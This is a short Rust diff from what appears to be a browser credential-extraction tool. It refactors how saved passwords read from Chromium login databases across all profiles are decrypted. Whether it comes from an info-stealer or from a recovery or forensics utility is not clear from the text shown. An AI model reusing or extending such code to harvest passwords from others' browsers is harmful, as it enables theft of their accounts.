@@ -1,4 +1,4 @@
-use crate::chromium::{decrypt_data, BrowserData};
+use crate::chromium::BrowserData;
 use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Password};
 use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
@@ -52,7 +52,7 @@ fn extract_password_from_record(record: &dyn TableRecord, browser_data: &Browser
     let password = record
         .get_value(LOGINS_PASSWORD_VALUE)
         .and_then(|value| value.as_blob())
-        .and_then(|blob| unsafe { decrypt_data(blob, browser_data) });
+        .and_then(|blob| unsafe { browser_data.decrypt_data(blob) });
 
     if let (None, None) = (&username, &password) {
         return None
